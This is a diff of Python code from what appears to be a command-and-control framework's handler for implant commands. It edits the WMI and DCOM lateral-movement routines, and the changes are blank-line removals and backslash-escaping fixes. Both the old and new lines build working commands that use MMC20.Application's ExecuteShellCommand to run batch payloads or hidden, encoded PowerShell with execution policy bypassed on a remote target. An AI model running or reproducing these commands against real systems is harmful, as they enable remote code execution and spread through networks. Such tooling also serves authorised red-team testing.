@@ -181,7 +181,6 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
       new_task(cmd, user, randomuri)
       
     # wmi lateral movement
-
     elif "invoke-wmiproxypayload" in command.lower():
       check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
       if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,"Proxy"))):
@@ -218,7 +217,6 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
       new_task(cmd, user, randomuri)
 
     # dcom lateral movement
-
     elif "invoke-dcomproxypayload" in command.lower():
       if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,"Proxy"))):
         with open("%s%spayload.bat" % (PayloadsDirectory,"Proxy"), "r") as p: payload = p.read()
@@ -226,7 +224,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         params = params.sub("", command)
         p = re.compile(r'(?<=-target.).*')
         target = re.search(p, command).group()
-        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\Windows\System32\cmd.exe\",$null,\"/c %s\",\"7\")" % (target,payload)
+        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c %s\",\"7\")" % (target,payload)
         new_task(pscommand, user, randomuri)
       else:
         startup(user, "Need to run createproxypayload first")
@@ -237,7 +235,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
         p = re.compile(r'(?<=-target.).*')
         target = re.search(p, command).group()
-        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\Windows\System32\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
+        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
         new_task(pscommand, user, randomuri)
       else:
         startup(user, "Need to run createdaisypayload first")
@@ -250,11 +248,10 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
       payload = newPayload.CreateRawBase()
       p = re.compile(r'(?<=-target.).*')
       target = re.search(p, command).group()
-      pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\Windows\System32\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
+      pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
       new_task(pscommand, user, randomuri)
 
     # runas payloads
-
     elif "invoke-runasdaisypayload" in command.lower():
       daisyname = raw_input("Name required: ")
       if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
